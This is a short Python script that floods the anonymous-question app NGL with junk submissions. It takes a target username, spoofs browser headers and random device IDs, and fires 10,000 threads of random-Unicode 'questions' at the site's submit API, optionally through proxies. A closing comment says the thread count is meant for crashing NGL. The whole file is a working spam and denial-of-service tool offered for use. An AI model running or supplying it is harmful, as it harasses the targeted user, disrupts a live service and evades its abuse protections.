from httpx import post
from uuid import uuid4
from threading import Thread
from random import randrange

def asciigen(length):
    characters = ''
    for x in range(int(length)):
        characters = characters + chr(randrange(13000))
    return characters 

def worker(username, proxies=None):
    try:
        response = post("https://ngl.link/api/submit",
            headers={
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9,th;q=0.8",
            "cache-control": "no-cache",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "pragma": "no-cache",
            "sec-ch-ua": "\"Google Chrome\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "referrer" : F"https://ask-fun-d10f0.firebaseapp.com/{username}",
            "referrerPolicy": "strict-origin-when-cross-origin"
        },
            data={
            "username": username,
            "question": asciigen(75),
            "deviceId": "-".join([uuid4().hex[i:i+8] for i in range(0, 32, 8)]),
            "gameSlug": "",
            "referrer": "",
        },proxies=proxies
        )
        if "questionId" in response.text:
            print(F"SUC {response.json()['questionId']}")
        else:
            print(F"FL {response.status_code}")

    except:
        pass       

def run(threads : int ,username : str , proxies):

    T = []

    for thread in range(threads):
        thread = Thread(target=worker,args=(username, proxies,))
        T.append(thread)

    for thread in T:
        thread.start()

    for thread in T:
        thread.join()

username = input("user ")
proxies = ""
run(10000, username, proxies) #if proxyless thread don't exceed 100 but 10000 thread for Crashing NGL with proxy
